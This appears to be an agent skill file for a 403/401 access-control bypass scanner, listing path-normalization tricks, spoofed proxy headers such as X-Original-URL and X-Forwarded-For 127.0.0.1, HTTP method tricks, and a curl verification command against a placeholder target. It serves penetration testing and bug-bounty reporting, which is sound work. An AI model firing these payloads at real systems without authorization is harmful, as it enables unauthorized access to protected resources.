
# bypass-403 — Access Control Bypass Scanner

## When to use
- A target returns `403 Forbidden` or `401 Unauthorized` on a path you want to reach.
- You're testing whether a reverse proxy (nginx/Apache/Cloudflare/ALB) enforces ACLs differently than the backend app.
- After discovering a path via recon (ffuf/gobuster/wayback) that is blocked.

## Core insight
Most 403s come from the **proxy layer** (nginx `location` blocks, Apache `<Location>`, WAF rules, ALB rules) while the **backend app** does its own routing. If the two disagree on how to parse the URL, the request slips through. Same for headers: some proxies trust `X-Forwarded-For` / `X-Original-URL` and rewrite the request before the ACL is evaluated.

## Two classes of bypass

### 1. Path / URL normalization mismatch
The proxy blocks the *normalized* path but the backend routes on the *raw* path.

| Trick | Example |
|---|---|
| trailing dot | `/admin/.` |
| double slash | `//admin//` |
| encoded dot | `/%2e/admin`, `/admin/%2e/` |
| path params | `/admin/..;/`, `/admin;/`, `/admin%2f` |
| trailing chars | `/admin%20`, `/admin%09`, `/admin?`, `/admin.html`, `/admin.json`, `/admin.php`, `/admin/*` |
| case | `/Admin`, `/ADMIN` |
| dot-segment | `/./admin/./`, `/admin/..;/` |

### 2. Header-based (proxy trusts client)
```
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Override-URL: /admin
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 127.0.0.1:80
X-Forwarded-For: localhost
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Host: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forwarded-Server: 127.0.0.1
X-HTTP-Method-Override: PUT
Referer: <same-url>
```
Note: `X-Original-URL` / `X-Rewrite-URL` values **must include the leading slash** — `/admin`, not `admin`.

### 3. Method tricks
`POST` with `Content-Length: 0`, `PUT`, `PATCH`, `TRACE`, `OPTIONS` — some ACLs only cover `GET`.

## CRITICAL: curl normalizes paths by default
This is the #1 bug in every "bypass 403" script on GitHub. Without `--path-as-is`, curl collapses `../`, `//`, and `/.` **before sending**:
```
curl "/admin/../secret"              -> GET /secret            (blocked test becomes a different request)
curl --path-as-is "/admin/../secret" -> GET /admin/../secret   (correct)
```
**Always pass `--path-as-is`.** Also: don't use `-L` when scanning for bypasses — following redirects masks the real response (403 -> 302 -> 200 looks like a bypass but isn't).

## Usage

```bash
bypass403 https://target.com admin
bypass403 https://target.com api/internal --ip 10.0.0.5
bash scripts/bypass403.sh https://target.com admin --no-color
```

The script:
1. Fetches a baseline (`$URL/$PATH`) and records code + size + body.
2. Runs ~40 probes (path / header / method).
3. Marks a line `*` **only when** it returns 2xx **and** the body differs from baseline — real bypass signal, not noise.
4. Prints `=` for same-as-baseline, `!` for failed request.

## Verification after a hit
A 2xx with a different body is a *candidate*, not a confirmed bypass. Confirm:
```bash
curl -sk --path-as-is -H 'X-Original-URL: /admin' https://target.com/ -i | head -30
```
Check the body is real protected content (not a generic 200 landing page or a soft-404). Compare content-length and a unique string from the protected page.

## Pitfalls
- `-k` (skip TLS verify) trips Hermes security scan and needs approval — drop it against targets with valid certs.
- `pkill -f mock403.py` self-matches the pkill command itself; kill by port instead: `ss -ltnp | grep ':PORT'`.
- Some CDNs return 200 + challenge page for everything; verify the body before claiming a bypass.
- Header tricks only work if the proxy *trusts* the header — test `X-Forwarded-For` against an allowlisted IP (e.g. `127.0.0.1`), not your own.
- Wayback lookup can be slow/unavailable; treat as best-effort.

## Reporting
Impact = "access control bypass on `<path>` exposing `<what>`". Always include the raw request (method + path-as-is + headers) and the response proving protected content. If it only reaches a login page or a soft-404, it's informational, not a finding.
